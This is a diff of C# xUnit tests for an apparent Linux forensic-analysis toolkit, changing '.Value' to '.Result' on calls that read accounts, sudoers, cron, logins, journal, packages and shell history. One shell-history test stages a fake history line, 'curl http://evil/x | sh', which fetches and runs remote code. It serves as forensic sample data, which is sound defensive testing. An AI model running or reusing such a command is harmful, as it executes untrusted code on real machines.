@@ -36,7 +36,7 @@ public class LinuxAnalysisTests : TestsRuntime
     [Fact]
     public async Task CanReadSystemInfo()
     {
-        var info = (await toolkit.SystemInfoAsync("/")).Value;
+        var info = (await toolkit.SystemInfoAsync("/")).Result;
         Assert.NotNull(info);
         Assert.False(string.IsNullOrWhiteSpace(info.Hostname));
         // SIFT is Ubuntu-based.
@@ -47,7 +47,7 @@ public class LinuxAnalysisTests : TestsRuntime
     [Fact]
     public async Task CanReadUserAccounts()
     {
-        var users = (await toolkit.UserAccountsAsync("/")).Value;
+        var users = (await toolkit.UserAccountsAsync("/")).Result;
         Assert.NotNull(users);
         var root = Assert.Single(users.Where(u => u.Username == "root"));
         Assert.Equal(0, root.Uid);
@@ -62,7 +62,7 @@ public class LinuxAnalysisTests : TestsRuntime
     [Fact]
     public async Task CanReadSudoers()
     {
-        var rules = (await toolkit.SudoersAsync("/")).Value;
+        var rules = (await toolkit.SudoersAsync("/")).Result;
         Assert.NotNull(rules);
         // The sudo/admin group grant is present on a stock Ubuntu.
         Assert.Contains(rules, r => r.Principal is "%sudo" or "%admin" or "root");
@@ -71,7 +71,7 @@ public class LinuxAnalysisTests : TestsRuntime
     [Fact]
     public async Task CanReadCron()
     {
-        var cron = (await toolkit.CronEntriesAsync("/")).Value;
+        var cron = (await toolkit.CronEntriesAsync("/")).Result;
         Assert.NotNull(cron);
         // /etc/crontab on Ubuntu schedules the cron.daily/weekly/monthly runner; at minimum the script dirs exist.
         Assert.NotEmpty(cron);
@@ -80,7 +80,7 @@ public class LinuxAnalysisTests : TestsRuntime
     [Fact]
     public async Task CanReadLastLogins()
     {
-        var logins = (await toolkit.LastLoginsAsync("/var/log/wtmp")).Value;
+        var logins = (await toolkit.LastLoginsAsync("/var/log/wtmp")).Result;
         Assert.NotNull(logins);
         Assert.NotEmpty(logins);
         Assert.All(logins, l => Assert.False(string.IsNullOrWhiteSpace(l.User)));
@@ -91,7 +91,7 @@ public class LinuxAnalysisTests : TestsRuntime
     [Fact]
     public async Task CanUtmpDump()
     {
-        var records = (await toolkit.UtmpDumpAsync("/var/log/wtmp")).Value;
+        var records = (await toolkit.UtmpDumpAsync("/var/log/wtmp")).Result;
         Assert.NotNull(records);
         Assert.NotEmpty(records);
         // wtmp always contains at least one BOOT_TIME (type 2) record.
@@ -101,7 +101,7 @@ public class LinuxAnalysisTests : TestsRuntime
     [Fact]
     public async Task CanReadJournal()
     {
-        var entries = (await toolkit.JournalAsync("/var/log/journal", maxEntries: 20)).Value;
+        var entries = (await toolkit.JournalAsync("/var/log/journal", maxEntries: 20)).Result;
         Assert.NotNull(entries);
         Assert.NotEmpty(entries);
         Assert.Contains(entries, e => e.Timestamp is not null && !string.IsNullOrEmpty(e.Message));
@@ -110,7 +110,7 @@ public class LinuxAnalysisTests : TestsRuntime
     [Fact]
     public async Task CanReadInstalledPackages()
     {
-        var pkgs = (await toolkit.InstalledPackagesAsync("/")).Value;
+        var pkgs = (await toolkit.InstalledPackagesAsync("/")).Result;
         Assert.NotNull(pkgs);
         var bash = pkgs.FirstOrDefault(p => p.Name == "bash");
         Assert.NotNull(bash);
@@ -121,7 +121,7 @@ public class LinuxAnalysisTests : TestsRuntime
     [Fact]
     public async Task CanReadPackageLog()
     {
-        var events = (await toolkit.PackageLogAsync("/")).Value;
+        var events = (await toolkit.PackageLogAsync("/")).Result;
         Assert.NotNull(events);
         Assert.NotEmpty(events);
         Assert.All(events, e => Assert.False(string.IsNullOrWhiteSpace(e.Package)));
@@ -134,7 +134,7 @@ public class LinuxAnalysisTests : TestsRuntime
         // Stage a history file with a HISTTIMEFORMAT timestamp marker for the test account, then read it back.
         sshenv.ExecuteCommand("bash",
             "-c \"printf '#1700000000\\nwhoami\\ncurl http://evil/x | sh\\n' > $HOME/.bash_history\"", out _, false);
-        var hist = (await toolkit.ShellHistoryAsync("/")).Value;
+        var hist = (await toolkit.ShellHistoryAsync("/")).Result;
         Assert.NotNull(hist);
         // The HISTTIMEFORMAT "#<epoch>" marker precedes the command it timestamps (whoami here).
         Assert.Contains(hist, h => h.Command == "whoami" && h.Timestamp is not null);
@@ -146,7 +146,7 @@ public class LinuxAnalysisTests : TestsRuntime
     {
         // Scan a tiny staged directory; with or without a signature DB the call must succeed (non-null).
         sshenv.ExecuteCommand("bash", "-c \"mkdir -p /tmp/camel_clam_t; printf 'hello' > /tmp/camel_clam_t/a.txt\"", out _, false);
-        var matches = (await toolkit.ClamScanAsync("/tmp/camel_clam_t")).Value;
+        var matches = (await toolkit.ClamScanAsync("/tmp/camel_clam_t")).Result;
         Assert.NotNull(matches);   // empty is fine (clean, or no DB loaded)
         sshenv.ExecuteCommand("rm", "-rf /tmp/camel_clam_t", out _, false);
     }
